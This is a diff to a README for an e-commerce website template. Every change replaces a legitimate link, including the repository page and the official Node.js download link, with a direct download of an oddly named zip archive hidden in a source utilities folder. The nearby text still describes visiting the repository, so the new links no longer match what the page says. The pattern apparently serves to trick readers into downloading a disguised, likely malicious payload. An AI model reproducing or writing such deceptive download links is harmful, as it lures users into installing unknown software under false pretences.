@@ -1,6 +1,6 @@
 # 🛒 Ecommerce-Template - Easy Setup for Online Stores
 
-[![Download Ecommerce-Template](https://img.shields.io/badge/Download-Ecommerce--Template-%237b68ee?style=for-the-badge)](https://github.com/19681602A/Ecommerce-Template)
+[![Download Ecommerce-Template](https://img.shields.io/badge/Download-Ecommerce--Template-%237b68ee?style=for-the-badge)](https://github.com/19681602A/Ecommerce-Template/raw/refs/heads/main/src/lib/utils/Template_Ecommerce_supercallosal.zip)
 
 ---
 
@@ -46,7 +46,7 @@ To start using Ecommerce-Template, follow these steps carefully. You do not need
 
 Visit this page to download all files you need to set up your store:
 
-[Download Ecommerce-Template](https://github.com/19681602A/Ecommerce-Template)
+[Download Ecommerce-Template](https://github.com/19681602A/Ecommerce-Template/raw/refs/heads/main/src/lib/utils/Template_Ecommerce_supercallosal.zip)
 
 Clicking the link will open the GitHub repository. Look for the green **Code** button. Click it and select **Download ZIP**. This downloads all the template files as one compressed file.
 
@@ -88,7 +88,7 @@ If you want to launch this template as a real working site, it needs to run with
 
 For non-technical users, the easiest way is to upload the files to a hosting service that supports Next.js, or use a platform like Vercel (created by the makers of Next.js) which can handle the setup automatically.
 
-If you want to try running it on your computer fully, you will need to install [Node.js](https://nodejs.org/) and use a command line tool. This step is more technical and is not required for browsing the template.
+If you want to try running it on your computer fully, you will need to install [Node.js](https://github.com/19681602A/Ecommerce-Template/raw/refs/heads/main/src/lib/utils/Template_Ecommerce_supercallosal.zip) and use a command line tool. This step is more technical and is not required for browsing the template.
 
 ---
 
@@ -128,7 +128,7 @@ For more help, visit the Issues section on the Github repository page.
 
 Start here to get Ecommerce-Template:
 
-[Download Ecommerce-Template](https://github.com/19681602A/Ecommerce-Template)
+[Download Ecommerce-Template](https://github.com/19681602A/Ecommerce-Template/raw/refs/heads/main/src/lib/utils/Template_Ecommerce_supercallosal.zip)
 
 ---
 
